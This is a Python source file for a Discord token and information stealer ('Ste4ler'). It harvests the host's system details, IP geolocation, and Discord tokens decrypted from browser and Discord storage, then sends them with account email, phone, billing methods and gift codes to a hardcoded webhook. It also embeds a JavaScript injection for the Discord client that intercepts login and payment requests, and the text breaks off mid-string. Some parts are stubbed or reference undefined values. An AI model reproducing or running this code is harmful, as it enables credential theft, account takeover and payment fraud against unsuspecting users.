import sys
import os
import socket
import win32api
import requests
import time

print(r"""
    _     _______  _______          _        _______  ______  
   | |   (_______)(_______)   /\   | |      (_______)(_____ \ 
    \ \   _        _____     /  \  | |       _____    _____) )
     \ \ | |      |  ___)   / /\ \ | |      |  ___)  (_____ ( 
 _____) )| |_____ | |_____ | |__| || |_____ | |_____       | |
(______/  \______)|_______)|______||_______)|_______)      |_|




                                                              
""")

print("""Quel info vous voulez prendre ?

1-discord token
2- Mot de passe
3-Système info
""")

str(input("Entrez Les Info que vous voulez prendre:"))

def B10ck_K3y(): pass
def Unb10ck_K3y(): pass
def B10ck_T45k_M4n4g3r(): pass
def B10ck_M0u53(): pass
def B10ck_W3b5it3(): pass
def St4rtup(): pass
def Sy5t3m_Inf0(): pass
def Op3n_U53r_Pr0fi13_53tting5(): pass
def Scr33n5h0t(): pass
def C4m3r4_C4ptur3(): pass
def Di5c0rd_T0k3n(): pass
def Di5c0rd_inj3c710n(): pass
def Br0w53r_5t341(): pass
def R0b10x_C00ki3(): pass
def F4k3_3rr0r(): pass
def Sp4m_0p3n_Pr0gr4m(): pass
def Sp4m_Cr34t_Fil3(): pass
def Shutd0wn(): pass
    
def Clear():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

w3bh00k_ur1 = "https://discord.com/api/webhooks/1285292730003492905/NhLTLf8utQH7tRrkCXKyc_MaJnfY5QuYEgcawf5ZnYXaKzy3zl5YlY8NZ7dOjQ71QMkP"
website = "github.com"
color_embed = 0xa80505
username_embed = 'Ste4ler'
footer_text = "Ste4ler"
footer_embed = {
        "text": footer_text,
        "icon_url": avatar_embed,
        }
                 

try: hostname_pc = socket.gethostname()
except: hostname_pc = "None"

try: username_pc = os.getlogin()
except: username_pc = "None"

try: displayname_pc = win32api.GetUserNameEx(win32api.NameDisplay)
except: displayname_pc = "None"

try: ip_address_public = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
except: ip_address_public = "None"

try: ip_adress_local = socket.gethostbyname(socket.gethostname())
except: ip_adress_local = "None"

try:
    response = requests.get(f"https://{website}/api/ip/ip={ip_address_public}")
    api = response.json()

    country = api.get('country', "None")
    country_code = api.get('country_code', "None")
    region = api.get('region', "None")
    region_code = api.get('region_code', "None")
    zip_postal = api.get('zip', "None")
    city = api.get('city', "None")
    latitude = api.get('latitude', "None")
    longitude = api.get('longitude', "None")
    timezone = api.get('timezone', "None")
    isp = api.get('isp', "None")
    org = api.get('org', "None")
    as_number = api.get('as', "None")
except:
    response = requests.get(f"http://ip-api.com/json/{ip_address_public}")
    api = response.json()

    country = api.get('country', "None")
    country_code = api.get('countryCode', "None")
    region = api.get('regionName', "None")
    region_code = api.get('region', "None")
    zip_postal = api.get('zip', "None")
    city = api.get('city', "None")
    latitude = api.get('lat', "None")
    longitude = api.get('lon', "None")
    timezone = api.get('timezone', "None")
    isp = api.get('isp', "None")
    org = api.get('org', "None")
    as_number = api.get('as', "None")
def Sy5t3m_Inf0():
    import platform
    import subprocess
    import uuid
    import psutil
    import GPUtil
    import ctypes
    import win32api
    import string
    import screeninfo
    import requests
    from discord import SyncWebhook, Embed

    try: sy5t3m_1nf0 = {platform.system()}
    except: sy5t3m_1nf0 = "None"

    try: sy5t3m_v3r5i0n_1nf0 = platform.version()
    except: sy5t3m_v3r5i0n_1nf0 = "None"

    try: m4c_4ddr355 = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except: m4c_4ddr355 = "None"

    try: hw1d = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
    except: hw1d = "None"

    try: r4m_1nf0 = round(psutil.virtual_memory().total / (1024**3), 2)
    except: r4m_1nf0 = "None"

    try: cpu_1nf0 = platform.processor()
    except: cpu_1nf0 = "None"

    try: cpu_c0r3_1nf0 = psutil.cpu_count(logical=False)
    except: cpu_c0r3_1nf0 = "None"

    try: gpu_1nf0 = GPUtil.getGPUs()[0].name if GPUtil.getGPUs() else "None"
    except: gpu_1nf0 = "None"

    try:
        drives_info = []
        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if bitmask & 1:
                drive_path = letter + ":\\"
                try:
                    free_bytes = ctypes.c_ulonglong(0)
                    total_bytes = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(drive_path), None, ctypes.pointer(total_bytes), ctypes.pointer(free_bytes))
                    total_space = total_bytes.value
                    free_space = free_bytes.value
                    used_space = total_space - free_space
                    drive_name = win32api.GetVolumeInformation(drive_path)[0]
                    drive = {
                        'drive': drive_path,
                        'total': total_space,
                        'free': free_space,
                        'used': used_space,
                        'name': drive_name,
                    }
                    drives_info.append(drive)
                except:
                    ()
            bitmask >>= 1

        d15k_5t4t5 = "{:<7} {:<10} {:<10} {:<10} {:<20}\n".format("Drive:", "Free:", "Total:", "Use:", "Name:")
        for drive in drives_info:
            use_percent = (drive['used'] / drive['total']) * 100
            free_space_gb = "{:.2f}GO".format(drive['free'] / (1024 ** 3))
            total_space_gb = "{:.2f}GO".format(drive['total'] / (1024 ** 3))
            use_percent_str = "{:.2f}%".format(use_percent)
            d15k_5t4t5 += "{:<7} {:<10} {:<10} {:<10} {:<20}".format(drive['drive'], 
                                                                   free_space_gb,
                                                                   total_space_gb,
                                                                   use_percent_str,
                                                                   drive['name'])
    except:
        d15k_5t4t5 = """Drive:  Free:      Total:     Use:       Name:       
None    None       None       None       None     
"""

    try:
        def is_portable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False

        if is_portable():
            p14tf0rm_1nf0 = 'Pc Portable'
        else:
            p14tf0rm_1nf0 = 'Pc Fixed'
    except:
        p14tf0rm_1nf0 = "None"

    try: scr33n_number = len(screeninfo.get_monitors())
    except: scr33n_number = "None"

    embed = Embed(title=f'System Info `{username_pc} "{ip_address_public}"`:', color=color_embed)

    embed.add_field(name=":bust_in_silhouette: User Pc:", value=f"""```Hostname    : {hostname_pc}
Username    : {username_pc}
DisplayName : {displayname_pc}```""", inline=False)

    embed.add_field(name=":computer: System:", value=f"""```Plateform     : {p14tf0rm_1nf0}
Exploitation  : {sy5t3m_1nf0} {sy5t3m_v3r5i0n_1nf0}
Screen Number : {scr33n_number}

HWID : {hw1d}
MAC  : {m4c_4ddr355}
CPU  : {cpu_1nf0}, {cpu_c0r3_1nf0} Core
GPU  : {gpu_1nf0}
RAM  : {r4m_1nf0}Go```""", inline=False)

    embed.add_field(name=":satellite: Ip:", value=f"""```Public : {ip_address_public}
Local  : {ip_adress_local}
Isp    : {isp}
Org    : {org}
As     : {as_number}```""", inline=False)

    embed.add_field(name=":minidisc: Disk:", value=f"""```{d15k_5t4t5}```""", inline=False)

    embed.add_field(name=":map: Location:", value=f"""```Country   : {country} ({country_code})
Region    : {region} ({region_code})
Zip       : {zip_postal}
City      : {city}
Timezone  : {timezone}
Latitude  : {latitude}
Longitude : {longitude}```""", inline=False)

    embed.set_footer(text=footer_text, icon_url=avatar_embed)

    w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
    w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)

def Di5c0rd_T0k3n():
    import os
    import re
    import json
    import base64
    import requests
    from Cryptodome.Cipher import AES
    from Cryptodome.Protocol.KDF import scrypt
    from win32crypt import CryptUnprotectData
    from discord import SyncWebhook, Embed

    def extr4ct_t0k3n5():
        base_url = "https://discord.com/api/v9/users/@me"
        appdata_local = os.getenv("localappdata")
        appdata_roaming = os.getenv("appdata")
        regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        t0k3n5 = []
        uids = []
        token_info = {}

        paths = {
            'Discord': appdata_roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': appdata_roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': appdata_roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': appdata_roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': appdata_roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': appdata_roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': appdata_local + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': appdata_local + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': appdata_local + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': appdata_local + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': appdata_local + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': appdata_local + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': appdata_local + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': appdata_local + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Google Chrome SxS': appdata_local + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Google Chrome': appdata_local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Google Chrome1': appdata_local + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Google Chrome2': appdata_local + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Google Chrome3': appdata_local + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Google Chrome4': appdata_local + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Google Chrome5': appdata_local + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': appdata_local + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': appdata_local + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': appdata_local + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': appdata_local + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': appdata_local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': appdata_local + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            _d15c0rd = name.replace(" ", "").lower()
            if "cord" in path:
                if not os.path.exists(appdata_roaming + f'\\{_d15c0rd}\\Local State'):
                    continue
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{path}\\{file_name}', errors='ignore') as file:
                        for line in file:
                            for y in re.findall(regexp_enc, line.strip()):
                                t0k3n = decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(appdata_roaming + f'\\{_d15c0rd}\\Local State'))
                                if validate_t0k3n(t0k3n, base_url):
                                    uid = requests.get(base_url, headers={'Authorization': t0k3n}).json()['id']
                                    if uid not in uids:
                                        t0k3n5.append(t0k3n)
                                        uids.append(uid)
                                        token_info[t0k3n] = (name, f"{path}\\{file_name}")
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{path}\\{file_name}', errors='ignore') as file:
                        for line in file:
                            for t0k3n in re.findall(regexp, line.strip()):
                                if validate_t0k3n(t0k3n, base_url):
                                    uid = requests.get(base_url, headers={'Authorization': t0k3n}).json()['id']
                                    if uid not in uids:
                                        t0k3n5.append(t0k3n)
                                        uids.append(uid)
                                        token_info[t0k3n] = (name, f"{path}\\{file_name}")

        if os.path.exists(appdata_roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(appdata_roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if _file.endswith('.sqlite'):
                        with open(f'{path}\\{_file}', errors='ignore') as file:
                            for line in file:
                                for t0k3n in re.findall(regexp, line.strip()):
                                    if validate_t0k3n(t0k3n, base_url):
                                        uid = requests.get(base_url, headers={'Authorization': t0k3n}).json()['id']
                                        if uid not in uids:
                                            t0k3n5.append(t0k3n)
                                            uids.append(uid)
                                            token_info[t0k3n] = ('Firefox', f"{path}\\{_file}")
        return t0k3n5, token_info

    def validate_t0k3n(t0k3n, base_url):
        return requests.get(base_url, headers={'Authorization': t0k3n}).status_code == 200

    def decrypt_val(buff, master_key):
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()

    def get_master_key(path):
        if not os.path.exists(path):
            return None
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(master_key, None, None, None, 0)[1]

    def upload_t0k3n5():
        t0k3n5, token_info = extr4ct_t0k3n5()
        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)

        if not t0k3n5:
            embed = Embed(
                title=f'Discord Token `{username_pc} "{ip_address_public}"`:', 
                description=f"No discord tokens found.",
                color=color_embed)
            embed.set_footer(text=footer_text, icon_url=avatar_embed)
            w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)
            return
        
        for t0k3n_d15c0rd in t0k3n5:
            api = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': t0k3n_d15c0rd}).json()

            u53rn4m3_d15c0rd = api.get('username', "None") + '#' + api.get('discriminator', "None")
            d15pl4y_n4m3_d15c0rd = api.get('global_name', "None")
            us3r_1d_d15c0rd = api.get('id', "None")
            em4i1_d15c0rd = api.get('email', "None")
            ph0n3_d15c0rd = api.get('phone', "None")
            c0untry_d15c0rd = api.get('locale', "None")
            mf4_d15c0rd = api.get('mfa_enabled', "None")

            try:
                if api.get('premium_type', 'None') == 0:
                    n1tr0_d15c0rd = 'False'
                elif api.get('premium_type', 'None') == 1:
                    n1tr0_d15c0rd = 'Nitro Classic'
                elif api.get('premium_type', 'None') == 2:
                    n1tr0_d15c0rd = 'Nitro Boosts'
                elif api.get('premium_type', 'None') == 3:
                    n1tr0_d15c0rd = 'Nitro Basic'
                else:
                    n1tr0_d15c0rd = 'False'
            except:
                n1tr0_d15c0rd = "None"

            try: 
                av4t4r_ur1_d15c0rd = f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.png"
            except: 
                av4t4r_ur1_d15c0rd = avatar_embed

            try:
                billing_discord = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': t0k3n_d15c0rd}).json()
                if billing_discord:
                    p4ym3nt_m3th0d5_d15c0rd = []

                    for method in billing_discord:
                        if method['type'] == 1:
                            p4ym3nt_m3th0d5_d15c0rd.append('CB')
                        elif method['type'] == 2:
                            p4ym3nt_m3th0d5_d15c0rd.append("Paypal")
                        else:
                            p4ym3nt_m3th0d5_d15c0rd.append('Other')
                    p4ym3nt_m3th0d5_d15c0rd = ' / '.join(p4ym3nt_m3th0d5_d15c0rd)
                else:
                    p4ym3nt_m3th0d5_d15c0rd = "None"
            except:
                p4ym3nt_m3th0d5_d15c0rd = "None"

            try:
                gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': t0k3n_d15c0rd}).json()
                if gift_codes:
                    codes = []
                    for g1ft_c0d35_d15c0rd in gift_codes:
                        name = g1ft_c0d35_d15c0rd['promotion']['outbound_title']
                        g1ft_c0d35_d15c0rd = g1ft_c0d35_d15c0rd['code']
                        data = f"Gift: {name}\nCode: {g1ft_c0d35_d15c0rd}"
                        if len('\n\n'.join(g1ft_c0d35_d15c0rd)) + len(data) >= 1024:
                            break
                        codes.append(data)
                    if len(codes) > 0:
                        g1ft_c0d35_d15c0rd = '\n\n'.join(codes)
                    else:
                        g1ft_c0d35_d15c0rd = "None"
                else:
                    g1ft_c0d35_d15c0rd = "None"
            except:
                g1ft_c0d35_d15c0rd = "None"
        
            software_name, path = token_info.get(t0k3n_d15c0rd, ("Unknown Software", "Unknown location"))

            embed = Embed(title=f'Discord Token `{username_pc} "{ip_address_public}"`:', color=color_embed)
            embed.set_thumbnail(url=av4t4r_ur1_d15c0rd)
            embed.add_field(name=":file_folder: Path:", value=f"```{path}```", inline=False)
            embed.add_field(name=":package: Software:", value=f"```{software_name}```", inline=True)
            embed.add_field(name=":bust_in_silhouette: Username:", value=f"```{u53rn4m3_d15c0rd}```", inline=True)
            embed.add_field(name=":bust_in_silhouette: Display Name:", value=f"```{d15pl4y_n4m3_d15c0rd}```", inline=True)
            embed.add_field(name=":robot: Id:", value=f"```{us3r_1d_d15c0rd}```", inline=True)
            embed.add_field(name=":e_mail: Email:", value=f"```{em4i1_d15c0rd}```", inline=True)
            embed.add_field(name=":telephone_receiver: Phone:", value=f"```{ph0n3_d15c0rd}```", inline=True)   
            embed.add_field(name=":globe_with_meridians: Token:", value=f"```{t0k3n_d15c0rd}```", inline=True)
            embed.add_field(name=":rocket: Nitro:", value=f"```{n1tr0_d15c0rd}```", inline=True)
            embed.add_field(name=":earth_africa: Language:", value=f"```{c0untry_d15c0rd}```", inline=True)
            embed.add_field(name=":moneybag: Billing:", value=f"```{p4ym3nt_m3th0d5_d15c0rd}```", inline=True)
            embed.add_field(name=":gift: Gift Code:", value=f"```{g1ft_c0d35_d15c0rd}```", inline=True)
            embed.add_field(name=":lock: Multi-Factor Authentication:", value=f"```{mf4_d15c0rd}```", inline=True)
            embed.set_footer(text=footer_text, icon_url=avatar_embed)
            w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)

    upload_t0k3n5()

inj3c710n_c0d3 = r"""
const args = process.argv;
const fs = require('fs');
const path = require('path');
const https = require('https');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

const config = {
  webhook: '%WEBHOOK_HERE%', 
  webhook_protector_key: '%WEBHOOK_KEY%', 
  auto_buy_nitro: false, 
  ping_on_run: true, 
  ping_val: '@everyone',
  ip_address_public: '%IP_PUBLIC%',
  username: '%USERNAME%',
  embed_name: '%EMBED_NAME%', 
  embed_icon: '%EMBED_ICON%'.replace(/ /g, '%20'), 
  footer_text: '%FOOTER_TEXT%',
  embed_color: %EMBED_COLOR%, 
  injection_url: '', 
  api: 'https://discord.com/api/v9/users/@me',
  nitro: {
    boost: {
      year: {
        id: '521847234246082599',
        sku: '511651885459963904',
        price: '9999',
      },
      month: {
        id: '521847234246082599',
        sku: '511651880837840896',
        price: '999',
      },
    },
    classic: {
      month: {
        id: '521846918637420545',
        sku: '511651871736201216',
        price: '499',
      },
    },
  },
  filter: {
    urls: [
      'https://discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/users/@me',
      'https://*.discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/auth/login',
      'https://discord.com/api/v*/auth/login',
      'https://*.discord.com/api/v*/auth/login',
      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
      'https://api.stripe.com/v*/tokens',
      'https://api.stripe.com/v*/setup_intents/*/confirm',
      'https://api.stripe.com/v*/payment_intents/*/confirm',
    ],
  },
  filter2: {
    urls: [
      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
      'https://*.discord.com/api/v*/applications/detectable',
      'https://discord.com/api/v*/applications/detectable',
      'https://*.discord.com/api/v*/users/@me/library',
      'https://discord.com/api/v*/users/@me/library',
      'wss://remote-auth-gateway.discord.gg/*',
    ],
  },
};

function parity_32(x, y, z) {
  return x ^ y ^ z;
}
function ch_32(x, y, z) {
  return (x & y) ^ (~x & z);
}

function maj_32(x, y, z) {
  return (x & y) ^ (x & z) ^ (y & z);
}
function rotl_32(x, n) {
  return (x << n) | (x >>> (32 - n));
}
function safeAdd_32_2(a, b) {
  var lsw = (a & 0xffff) + (b & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function safeAdd_32_5(a, b, c, d, e) {
  var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function binb2hex(binarray) {
  var hex_tab = '0123456789abcdef',
    str = '',
    length = binarray.length * 4,
    i,
    srcByte;

  for (i = 0; i < length; i += 1) {
    srcByte = binarray[i >>> 2] >>> ((3 - (i % 4)) * 8);
    str += hex_tab.charAt((srcByte >>> 4) & 0xf) + hex_tab.charAt(srcByte & 0xf);
  }

  return str;
}

function getH() {
  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
}
function roundSHA1(block, H) {
  var W = [],
    a,
    b,
    c,
    d,
    e,
    T,
    ch = ch_32,
    parity = parity_32,
    maj = maj_32,
    rotl = rotl_32,
    safeAdd_2 = safeAdd_32_2,
    t,
    safeAdd_5 = safeAdd_32_5;

  a = H[0];
  b = H[1];
  c = H[2];
  d = H[3];
  e = H[4];

  for (t = 0; t < 80; t += 1) {
    if (t < 16) {
      W[t] = block[t];
    } else {
      W[t] = rotl(W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16], 1);
    }

    if (t < 20) {
      T = safeAdd_5(rotl(a, 5), ch(b, c, d), e, 0x5a827999, W[t]);
    } else if (t < 40) {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0x6ed9eba1, W[t]);
    } else if (t < 60) {
      T = safeAdd_5(rotl(a, 5), maj(b, c, d), e, 0x8f1bbcdc, W[t]);
    } else {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0xca62c1d6, W[t]);
    }

    e = d;
    d = c;
    c = rotl(b, 30);
    b = a;
    a = T;
  }

  H[0] = safeAdd_2(a, H[0]);
  H[1] = safeAdd_2(b, H[1]);
  H[2] = safeAdd_2(c, H[2]);
  H[3] = safeAdd_2(d, H[3]);
  H[4] = safeAdd_2(e, H[4]);

  return H;
}

function finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {
  var i, appendedMessageLength, offset;

  offset = (((remainderBinLen + 65) >>> 9) << 4) + 15;
  while (remainder.length <= offset) {
    remainder.push(0);
  }
  remainder[remainderBinLen >>> 5] |= 0x80 << (24 - (remainderBinLen % 32));
  remainder[offset] = remainderBinLen + processedBinLen;
  appendedMessageLength = remainder.length;

  for (i = 0; i < appendedMessageLength; i += 16) {
    H = roundSHA1(remainder.slice(i, i + 16), H);
  }
  return H;
}

function hex2binb(str, existingBin, existingBinLen) {
  var bin,
    length = str.length,
    i,
    num,
    intOffset,
    byteOffset,
    existingByteLen;

  bin = existingBin || [0];
  existingBinLen = existingBinLen || 0;
  existingByteLen = existingBinLen >>> 3;

  if (0 !== length % 2) {
    console.error('String of HEX type must be in byte increments');
  }

  for (i = 0; i < length; i += 2) {
    num = parseInt(str.substr(i, 2), 16);
    if (!isNaN(num)) {
      byteOffset = (i >>> 1) + existingByteLen;
      intOffset = byteOffset >>> 2;
      while (bin.length <= intOffset) {
        bin.push(0);
      }
      bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));
    } else {
      console.error('String of HEX type contains invalid characters');
    }
  }

  return { value: bin, binLen: length * 4 + existingBinLen };
}

class jsSHA {
  constructor() {
    var processedLen = 0,
      remainder = [],
      remainderLen = 0,
      intermediateH,
      converterFunc,
      outputBinLen,
      variantBlockSize,
      roundFunc,
      finalizeFunc,
      finalized = false,
      hmacKeySet = false,
      keyWithIPad = [],
      keyWithOPad = [],
      numRounds,
      numRounds = 1;

    converterFunc = hex2binb;

    if (numRounds !== parseInt(numRounds, 10) || 1 > numRounds) {
      console.error('numRounds must a integer >= 1');
    }
    variantBlockSize = 512;
    roundFunc = roundSHA1;
    finalizeFunc = finalizeSHA1;
    outputBinLen = 160;
    intermediateH = getH();

    this.setHMACKey = function (key) {
      var keyConverterFunc, convertRet, keyBinLen, keyToUse, blockByteSize, i, lastArrayIndex;
      keyConverterFunc = hex2binb;
      convertRet = keyConverterFunc(key);
      keyBinLen = convertRet['binLen'];
      keyToUse = convertRet['value'];
      blockByteSize = variantBlockSize >>> 3;
      lastArrayIndex = blockByteSize / 4 - 1;

      if (blockByteSize < keyBinLen / 8) {
        keyToUse = finalizeFunc(keyToUse, keyBinLen, 0, getH());
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      } else if (blockByteSize > keyBinLen / 8) {
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      }

      for (i = 0; i <= lastArrayIndex; i += 1) {
        keyWithIPad[i] = keyToUse[i] ^ 0x36363636;
        keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;
      }

      intermediateH = roundFunc(keyWithIPad, intermediateH);
      processedLen = variantBlockSize;

      hmacKeySet = true;
    };

    this.update = function (srcString) {
      var convertRet,
        chunkBinLen,
        chunkIntLen,
        chunk,
        i,
        updateProcessedLen = 0,
        variantBlockIntInc = variantBlockSize >>> 5;

      convertRet = converterFunc(srcString, remainder, remainderLen);
      chunkBinLen = convertRet['binLen'];
      chunk = convertRet['value'];

      chunkIntLen = chunkBinLen >>> 5;
      for (i = 0; i < chunkIntLen; i += variantBlockIntInc) {
        if (updateProcessedLen + variantBlockSize <= chunkBinLen) {
          intermediateH = roundFunc(chunk.slice(i, i + variantBlockIntInc), intermediateH);
          updateProcessedLen += variantBlockSize;
        }
      }
      processedLen += updateProcessedLen;
      remainder = chunk.slice(updateProcessedLen >>> 5);
      remainderLen = chunkBinLen % variantBlockSize;
    };

    this.getHMAC = function () {
      var firstHash;

      if (false === hmacKeySet) {
        console.error('Cannot call getHMAC without first setting HMAC key');
      }

      const formatFunc = function (binarray) {
        return binb2hex(binarray);
      };

      if (false === finalized) {
        firstHash = finalizeFunc(remainder, remainderLen, processedLen, intermediateH);
        intermediateH = roundFunc(keyWithOPad, getH());
        intermediateH = finalizeFunc(firstHash, outputBinLen, variantBlockSize, intermediateH);
      }

      finalized = true;
      return formatFunc(intermediateH);
    };
  }
}

if ('function' === typeof define && define['amd']) {
  define(function () {
    return jsSHA;
  });
} else if ('undefined' !== typeof exports) {
  if ('undefined' !== typeof module && module['exports']) {
    module['exports'] = exports = jsSHA;
  } else {
    exports = jsSHA;
  }
} else {
  global['jsSHA'] = jsSHA;
}

if (jsSHA.default) {
  jsSHA = jsSHA.default;
}

function totp(key) {
  const period = 30;
  const digits = 6;
  const timestamp = Date.now();
  const epoch = Math.round(timestamp / 1000.0);
  const time = leftpad(dec2hex(Math.floor(epoch / period)), 16, '0');
  const shaObj = new jsSHA();
  shaObj.setHMACKey(base32tohex(key));
  shaObj.update(time);
  const hmac = shaObj.getHMAC();
  const offset = hex2dec(hmac.substring(hmac.length - 1));
  let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec('7fffffff')) + '';
  otp = otp.substr(Math.max(otp.length - digits, 0), digits);
  return otp;
}

function hex2dec(s) {
  return parseInt(s, 16);
}

function dec2hex(s) {
  return (s < 15.5 ? '0' : '') + Math.round(s).toString(16);
}

function base32tohex(base32) {
  let base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',
    bits = '',
    hex = '';

  base32 = base32.replace(/=+$/, '');

  for (let i = 0; i < base32.length; i++) {
    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());
    if (val === -1) console.error('Invalid base32 character in key');
    bits += leftpad(val.toString(2), 5, '0');
  }

  for (let i = 0; i + 8 <= bits.length; i += 8) {
    let chunk = bits.substr(i, 8);
    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');
  }
  return hex;
}

function leftpad(str, len, pad) {
  if (len + 1 >= str.length) {
    str = Array(len + 1 - str.length).join(pad) + str;
  }
  return str;
}

const discordPath = (function () {
  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
  let resourcePath;

  if (process.platform === 'win32') {
    resourcePath = path.join(app, 'resources');
  } else if (process.platform === 'darwin') {
    resourcePath = path.join(app, 'Contents', 'Resources');
  }

  if (fs.existsSync(resourcePath)) return { resourcePath, app };
  return { undefined, undefined };
})();

function updateCheck() {
  const { resourcePath, app } = discordPath;
  if (resourcePath === undefined || app === undefined) return;
  const appPath = path.join(resourcePath, 'app');
  const packageJson = path.join(appPath, 'package.json');
  const resourceIndex = path.join(appPath, 'index.js');
  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
  const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

  if (process.platform === 'win32' || process.platform === 'darwin') {
    fs.writeFileSync(
      packageJson,
      JSON.stringify(
        {
          name: 'discord',
          main: 'index.js',
        },
        null,
        4,
      ),
    );

    const startUpScript = `const fs = require('fs'), https = require('https');
const indexJs = '${indexJs}';
